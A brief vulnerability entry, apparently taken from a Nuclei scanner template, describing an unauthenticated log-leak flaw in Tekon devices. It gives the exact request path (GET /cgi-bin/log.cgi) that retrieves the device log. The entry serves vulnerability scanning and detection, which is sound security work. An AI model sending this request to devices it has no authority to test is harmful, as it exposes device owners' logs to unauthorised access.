# Vulnerability: Tekon - Unauthenticated Log Leak
**Classification:** TEKON
**Source:** Nuclei Template (`tekon-info-leak.yaml`)

## Description
A vulnerability in Tekon allows remote unauthenticated users to disclose the Log of the remote device

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/log.cgi
```

